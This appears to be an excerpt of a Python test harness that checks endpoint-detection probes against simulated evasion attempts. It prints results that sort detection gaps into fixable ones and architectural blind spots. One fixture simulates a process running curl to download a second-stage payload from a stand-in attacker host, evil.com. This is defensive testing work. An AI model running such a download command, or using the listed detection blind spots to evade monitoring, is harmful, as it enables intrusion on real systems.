...
def _ctx(
    probe: MicroProbe, key: str, data: Any, extra: Optional[Dict[str, Any]] = None
) -> ProbeContext:
...
def _baseline_then_scan(
    probe: MicroProbe, key: str, attack_data: Any
) -> List[TelemetryEvent]:
        ...
        events = _scan(
            ...
            [
                _proc(
                    ...
                    name="curl",
                    exe="/usr/bin/curl",
                    cmdline=["curl", "-o", "/tmp/payload", "https://evil.com/stage2"],
...
def main() -> int:
    ...
    for test in tests:
        ...
        result = EvasionResult(test=test, events=events, evaded=evaded, correct=correct)
        ...
        for r in cat_results:
            ...
            if r.events:
                print(
                    ...
                    f"{', '.join(e.event_type for e in r.events)}]",
                    end="",
                )
            print()
            print()
    ...
    architectural = sum(
        1 for r in results if r.evaded and r.test.category == "architectural_blind"
    )
    ...
    print(
        f"  Unexpected results:   {_yellow(str(unexpected)) if unexpected else _green('0')}"
    )
    print()
    print(f"  {_bold('Gap classification:')}")
    print(
        f"    Fixable gaps:         {_yellow(str(fixable))} (whitelist, threshold, coverage, naming)"
    )
    print(
        f"    Architectural blind:  {_red(str(architectural))} (need root/ESF/entitlements)"
    )
    print()
    ...
    arch_results = [
        r for r in results if r.evaded and r.test.category == "architectural_blind"
    ]
    if arch_results:
